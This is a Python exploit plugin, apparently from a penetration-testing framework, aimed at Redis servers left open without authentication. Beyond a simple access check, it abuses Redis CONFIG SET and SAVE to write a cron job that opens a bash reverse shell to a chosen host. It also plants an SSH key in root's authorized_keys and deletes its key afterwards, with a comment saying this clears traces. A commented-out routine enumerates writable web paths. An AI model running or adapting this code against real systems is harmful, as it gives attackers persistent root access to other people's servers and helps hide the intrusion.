#!/usr/bin/env python
# -*- coding: utf-8 -*-
__author__ = 'orleven'



def get_script_info(data=None):
    script_info = {
        "name": "reids unauth",
        "info": "ssh key should be configed",
        "level": "low",
        "type": "info",
        "author": "orleven",
        "url": "",
        "keyword": "tag:iis",
        "source": 1
    }
    return script_info

def prove(data):
    port = int(data['target_port']) if int(data['target_port']) != 0 else 6379
    data['target_port'] = port
    import redis
    try:
        r = redis.Redis(data['target_host'], port,socket_connect_timeout=5,socket_timeout=5)
        info = r.info()
        data['flag'] = True
        data['data'].append({"info": "info"})
        data['res'].append({"info":"The vul is exist!","redis_info": info})
    except :
        pass
    return data

def rebound(data):
    port = int(data['target_port']) if int(data['target_port']) != 0 else 6379
    data['target_port'] = port
    import redis
    if 'local_host' not in data.keys() or 'local_post' not in data.keys() :
        raise Exception("None local_host or local_post")
    try:
        r = redis.Redis(data['target_host'], port,socket_connect_timeout=5,socket_timeout=5)
        payload = '\n\n*/1 * * * * /bin/bash -i >& /dev/tcp/{ip}/{port} 0>&1\n\n'.format(ip=data["local_host"],
                                                                                         port=str(data["local_post"], ))
        path = '/var/spool/cron'
        name = 'root'
        key = _random_string(10)
        r.set(key, payload)
        r.config_set('dir', path)
        r.config_set('dbfilename', name)
        r.save()
        r.delete(key)  # 清除痕迹
        r.config_set('dir', '/tmp')
        data['flag'] = True
        data['data'].append({"key": key, "payload": payload, "path": path, "name": name})
        data['res'].append({"info":"Success","local_host": data["local_host"], "local_post": str(data["local_post"])})
    except:
        pass
    return data



def sshkey(data):
    port = int(data['target_port']) if int(data['target_port']) != 0 else 6379
    data['target_port'] = port

    public_key = 'ssh-rsa ====='

    private_key = """
    -----BEGIN RSA PRIVATE KEY-----
    =====
    -----END RSA PRIVATE KEY-----
    """
    if len(public_key)<20 or len(private_key)<120:
        raise Exception("None public_key or private_key")

    try:



        if _test_Connect(data['target_host'], 22,private_key):
            import redis, time
            r = redis.Redis(host=data['target_host'], port=port, db=0,socket_connect_timeout=5,socket_timeout=5)
            if 'redis_version' in r.info():
                key = _random_string(10)
                path = '/root/.ssh'
                name = 'authorized_keys'
                r.set(key, '\n\n' + public_key + '\n\n')
                r.config_set('dir', path)
                r.config_set('dbfilename',name)
                r.save()
                r.delete(key)  # 清除痕迹
                r.config_set('dir', '/tmp')
                time.sleep(5)
                if _test_Connect(data['target_host'], 22,private_key):
                    data['flag'] = True
                    data['data'].append({"key": key, "public_key": public_key, "path": path, "name": name})
                    data['res'].append({"info":"Success","local_host": data["local_host"], "local_post": str(data["local_post"])})
    except Exception:
        pass
    return data



# """
# redis getshell expliot (/var/spool/cron reverse shell)
#
# 检查Redis未授权访问->检查是否存在web服务->检查exp必需的权限和功能->枚举绝对路径->输出结果供手工测试
#
# """
#
# import redis
# from plugin.util import host2IP
# from plugin.util import randomString
# from plugin.util import redirectURL
# from plugin.util import checkPortTcp
# from plugin.static import ABSPATH_PREFIXES, ABSPATH_SUFFIXES
#
#
# def poc(url):
#     url = host2IP(url)
#     ip = url.split(':')[0]
#     port = int(url.split(':')[-1]) if ':' in url else 6379
#
#     for web_port in [80, 443, 8080, 8443]:  # 判断web服务
#         if checkPortTcp(ip, web_port):
#             try:
#                 real_url = redirectURL(ip + ':' + str(web_port))
#             except Exception:
#                 real_url = ip + ':' + str(web_port)
#             break  # TODO 这里简单化处理,只返回了一个端口的结果
#     else:
#         return False
#
#     try:
#         r = redis.Redis(host=ip, port=port, db=0, socket_timeout=5)
#         if 'redis_version' not in r.info():  # 判断未授权访问
#             return False
#         key = randomString(5)
#         value = randomString(5)
#         r.set(key, value)  # 判断可写
#         r.config_set('dir', '/root/')  # 判断对/var/www的写入权限(目前先判断为root)
#         r.config_set('dbfilename', 'dump.rdb')  # 判断操作权限
#         r.delete(key)
#         r.save()  # 判断可导出
#     except Exception, e:
#         return False
#
#     # 枚举绝对路径
#     path_list = []
#     for each in ABSPATH_PREFIXES.LINUX:
#         try:
#             r.config_set('dir', each.rstrip('/'))
#             path_list.append(each)
#             for suffix in ABSPATH_SUFFIXES:
#                 try:
#                     r.config_set('dir', suffix.rstrip('/'))
#                     path_list.append(each.rstrip('/') + '/' + suffix)
#                 except Exception:
#                     continue
#         except Exception:
#             continue
#
#     if len(path_list):
#         return real_url + ' ' + ' '.join(path_list)
#     else:
#         return False



def _random_string(length=8):
    import random
    from string import ascii_lowercase
    return ''.join([random.choice(ascii_lowercase) for _ in range(length)])


def _test_Connect(ip, port=22,private_key=None):
    import paramiko
    from paramiko.ssh_exception import SSHException
    try:
        s = paramiko.SSHClient()
        s.load_system_host_keys()
        s.connect(ip, port, username='root', pkey=private_key, timeout=10)
        s.close()
        return True
    except Exception as e :
        if type(e) == SSHException:
            return True
        return False



